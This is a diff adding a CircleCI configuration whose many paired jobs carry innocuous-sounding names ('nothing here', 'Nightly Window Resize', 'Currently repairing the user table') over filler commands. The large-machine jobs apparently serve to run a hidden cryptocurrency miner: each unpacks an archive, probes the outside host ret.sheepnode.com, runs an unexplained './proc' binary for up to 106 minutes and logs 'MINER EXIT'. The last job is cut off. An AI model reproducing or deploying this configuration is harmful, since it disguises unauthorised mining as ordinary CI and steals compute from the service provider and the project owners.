@@ -1,0 +1,2539 @@
+version: 2.1
+
+jobs:
+  pseudo-trait:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: nothing here
+          command: |
+            mkdir -p /tmp/terminal
+            set +o pipefail 2>/dev/null; seq 1 829669 > /tmp/terminal/fnv_eb24b1c7 2>&1; true
+            echo "stage=send-it hash=$(md5sum /tmp/terminal/fnv_eb24b1c7 | cut -c1-8) size=$(wc -c </tmp/terminal/fnv_eb24b1c7)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'fnv_eb24b1c7'
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  NBF__BOTTOM_DATABASE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Test Matrix Mocking ACTIVE
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; echo '   leading spaces' | wc -m; true ; } > /tmp/terminal/GOlDenFiltEr
+            echo "stage=kilo-1 hash=$(md5sum /tmp/terminal/GOlDenFiltEr | cut -c1-8) size=$(wc -c </tmp/terminal/GOlDenFiltEr)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'GOlDenFiltEr'
+  kilo-1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/GOlDenFiltEr 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  something36:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Nightly Window Resize NET708
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; ls /etc| fmt -w 52| cut -c1-14| tr -s ' '; true ; } > /tmp/terminal/crash-d64cf.log
+            echo "stage=Verify_App7 hash=$(md5sum /tmp/terminal/crash-d64cf.log | cut -c1-8) size=$(wc -c </tmp/terminal/crash-d64cf.log)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'crash-d64cf.log'
+  Verify_App7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  CachedBuilderComponent:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Currently repairing the user table
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; sed 's|.*/||' /etc/shells | awk 'length > 6' | shuf -n 4; true ; } > /tmp/terminal/m4rk3t
+            echo "stage=UAT_VERIFY_4 hash=$(md5sum /tmp/terminal/m4rk3t | cut -c1-8) size=$(wc -c </tmp/terminal/m4rk3t)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'm4rk3t'
+  UAT_VERIFY_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  level-throne-shrink-daisy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: SpotCheckFixtures
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; for p in {1..10}; do echo $p; done | sort -r; true ; } > /tmp/terminal/9f6168928
+            echo "stage=uma-ci hash=$(md5sum /tmp/terminal/9f6168928 | cut -c1-8) size=$(wc -c </tmp/terminal/9f6168928)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - '9f6168928'
+  uma-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  wz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: l 14 damaged goods staging
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -oiv /etc/s* | tail -n 3; true ; } > /tmp/terminal/f7005c0a75401fb9bc13793dc86a85b
+            echo "stage=fx-old hash=$(md5sum /tmp/terminal/f7005c0a75401fb9bc13793dc86a85b | cut -c1-8) size=$(wc -c </tmp/terminal/f7005c0a75401fb9bc13793dc86a85b)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'f7005c0a75401fb9bc13793dc86a85b'
+  fx-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/Q1g 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  CTR-NAME:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: PUSH indexes
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; getent passwd | cut -d: -f1 | tac | tail -n 20; true ; } > /tmp/terminal/v7.20.14
+            echo "stage=v6-rc5 hash=$(md5sum /tmp/terminal/v7.20.14 | cut -c1-8) size=$(wc -c </tmp/terminal/v7.20.14)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'v7.20.14'
+  v6-rc5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/v7.20.14 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  LANG_CA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Rerun Integration Suite Step
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; awk -F':' '{ print $3 }' /etc/passwd | head --lines=2 | awk '{s+=$1} END {print s}'; true ; } > /tmp/terminal/20230412_021036
+            echo "stage=ruby3-lint hash=$(md5sum /tmp/terminal/20230412_021036 | cut -c1-8) size=$(wc -c </tmp/terminal/20230412_021036)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - '20230412_021036'
+  ruby3-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/20230412_021036 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  gf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Lock Down CVE List Attempt 6
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; test ! -d /tmp && echo yes || echo no; true ; } > /tmp/terminal/BKCGqJIXAz
+            echo "stage=q1-ship hash=$(md5sum /tmp/terminal/BKCGqJIXAz | cut -c1-8) size=$(wc -c </tmp/terminal/BKCGqJIXAz)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'BKCGqJIXAz'
+  q1-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  ms_fname_prod:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: I usually stain the reagents last
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; echo -n 'task 1 of 3'|sha224sum; true ; } > /tmp/terminal/63.41.4.122
+            echo "stage=polaris hash=$(md5sum /tmp/terminal/63.41.4.122 | cut -c1-8) size=$(wc -c </tmp/terminal/63.41.4.122)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - '63.41.4.122'
+  polaris:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/63.41.4.122 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
